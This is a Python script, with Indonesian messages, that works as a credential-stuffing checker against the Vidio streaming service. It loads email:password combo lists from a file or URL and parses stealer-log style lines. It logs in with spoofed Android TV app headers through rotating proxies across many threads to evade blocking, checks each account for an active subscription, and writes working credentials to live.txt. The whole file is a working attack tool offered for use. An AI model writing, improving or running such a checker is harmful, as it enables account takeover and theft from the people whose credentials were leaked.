import argparse
import os
import re
import uuid
import requests
from colorama import Fore, init
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

from config import X_API_AUTH
from proxy_manager import ProxyManager

userAgent_vidio = "tv-android/2.46.10 (743)"
xApiInfo_vidio = "tv-android/10/2.46.10-743"

# Lock global untuk operasi file agar thread-safe
file_lock = Lock()

def session_id():
    return str(uuid.uuid4())


def fungsi_login(email, password, proxy_manager: ProxyManager = None, max_retries: int = 3):
    headers = {
        "X-Api-Platform": "tv-android",
        "X-Api-Auth": X_API_AUTH,
        "User-Agent": userAgent_vidio,
        "X-Api-App-Info": xApiInfo_vidio,
        "Accept-Language": "id",
        "X-Visitor-Id": session_id(),
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip",
        "Referer": "androidtv-app://com.vidio.android.tv"
    }

    url = "https://www.vidio.com/api/login"
    param = {"login": email, "password": password}

    attempt = 0
    current_proxy = proxy_manager.get_next_proxy() if proxy_manager else None

    while attempt < max_retries:
        try:
            response = requests.post(url, headers=headers, data=param, timeout=10, proxies=current_proxy)
            if response.status_code == 200:
                return response
        except requests.RequestException as e:
            print(Fore.RED + f"[!] Request error: {e}")
            if proxy_manager and current_proxy:
                proxy_manager.report_failure(current_proxy["http"])
        attempt += 1
        if proxy_manager:
            current_proxy = proxy_manager.get_next_proxy()

    return None


def fungsi_get_subs(user_token, email):
    headers = {
        "x-user-email": email,
        "x-user-token": user_token,
        "referer": "androidtv-app://com.vidio.android.tv",
        "x-api-platform": "tv-android",
        "x-api-app-info": xApiInfo_vidio,
        "user-agent": userAgent_vidio,
        "x-visitor-id": session_id(),
        "accept-language": "id",
        "x-api-auth": X_API_AUTH,
        "accept-encoding": "gzip",
        "accept": "application/json",
        "accept-charset": "UTF-8",
        "content-type": "application/json"
    }

    url = "https://api.vidio.com/api/users/has_active_subscription?device=polytron%20h2"
    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        result = response.json()
        return "ACTIVE" if result.get("has_active_subscription") else "INACTIVE"
    except:
        return None


def save_to_file(email, password, filename="live.txt"):
    entry = f"{email}:{password}"
    with file_lock:
        if os.path.exists(filename):
            with open(filename, "r") as f:
                data = f.read().splitlines()
            if entry in data:
                print(Fore.YELLOW + f"[!] {email} sudah ada di file.")
                return
        with open(filename, "a") as f:
            f.write(entry + "\n")
    print(Fore.GREEN + f"[✓] {email} disimpan ke file.")


def parse_credentials(line: str):
    line = line.strip()
    if "://" in line:
        line = line.split("://", 1)[1]
    parts = line.split(":", 2)
    if len(parts) != 3:
        return None, None
    return parts[1].strip(), parts[2].strip()


def proses_satu_akun(line, proxy_manager, output_file):
    email, password = parse_credentials(line)
    if not email or not password:
        print(Fore.RED + f"Format salah: {line}")
        return
    print(Fore.CYAN + f"[•] Proses login {email}")

    login_response = fungsi_login(email=email, password=password, proxy_manager=proxy_manager)
    if login_response:
        data = login_response.json()
        user_token = data.get("auth", {}).get("authentication_token")
        user_email = data.get("auth", {}).get("email")

        if user_token and user_email:
            subs = fungsi_get_subs(user_token, user_email)
            if subs == "ACTIVE":
                print(Fore.GREEN + f"[✓] {email} Langganan Aktif")
                save_to_file(email, password, filename=output_file)
            elif subs == "INACTIVE":
                print(Fore.YELLOW + f"[!] {email} Tidak ada langganan aktif")
            else:
                print(Fore.RED + f"[!] {email} Gagal cek langganan")
        else:
            print(Fore.RED + f"[!] {email} Login OK tapi token/email hilang")
    else:
        print(Fore.RED + f"[X] Login gagal untuk {email}")


def proses_akun(file_akun="akun.txt", proxy_manager: ProxyManager = None, workers: int = 20, output_file="live.txt"):
    if re.match(r"^https?://", file_akun):
        try:
            resp = requests.get(file_akun, timeout=10)
            resp.raise_for_status()
            lines = resp.text.splitlines()
        except requests.RequestException as e:
            print(Fore.RED + f"Gagal mengambil daftar akun: {e}")
            return
    else:
        with open(file_akun, "r") as f:
            lines = f.read().splitlines()

    print(Fore.BLUE + f"[•] Total akun: {len(lines)} — memproses dengan {workers} thread...")

    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(proses_satu_akun, line, proxy_manager, output_file) for line in lines]
        for future in as_completed(futures):
            future.result()


if __name__ == "__main__":
    init(autoreset=True)
    parser = argparse.ArgumentParser()
    parser.add_argument("akun", nargs="?", default="akun.txt", help="Path atau URL daftar akun")
    parser.add_argument("--use-proxy", action="store_true", help="Gunakan proxy saat request")
    parser.add_argument("--output", default="live.txt", help="File output untuk akun aktif")
    parser.add_argument("--workers", type=int, default=20, help="Jumlah thread untuk memproses akun")
    args = parser.parse_args()

    pm = None
    if args.use_proxy:
        pm = ProxyManager()
        pm.download_proxies()

    proses_akun(args.akun, proxy_manager=pm, workers=args.workers, output_file=args.output)
